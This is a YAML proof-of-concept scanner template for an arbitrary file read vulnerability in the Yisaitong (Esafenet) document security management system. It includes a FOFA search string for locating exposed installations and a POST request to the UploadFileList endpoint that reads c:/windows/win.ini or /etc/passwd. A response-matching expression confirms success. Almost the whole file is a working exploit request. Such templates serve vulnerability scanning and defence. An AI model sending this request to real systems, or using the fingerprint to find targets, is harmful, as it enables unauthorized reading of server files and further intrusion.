id: poc-yaml-yisaitong-esafenet-uploadfilelist-anyfile-read
info:
  name: 亿赛通电子文档安全管理系统 UploadFileList 任意文件读取漏洞
  severity: high
  tags:
  - 文件读取
  finger: 亿赛通电子文档安全管理系统
  fofa: app="亿赛通-电子文档安全管理系统"
variables:
  file: 'c:/windows/win.ini

    /etc/passwd'
requests:
- method: POST
  path: /CDGServer3/document/UploadFileList;login
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: command=VeiwUploadFile&filePath={{.file}}&fileName1=111111
  expression: (status_code == 200 && !contains(body,"<")) && ( (contains(body,"; for
    16-bit app support") && contains(body,"[files]")) || (contains(body,"root:") &&
    contains(body,"/bin")) )
transport: http
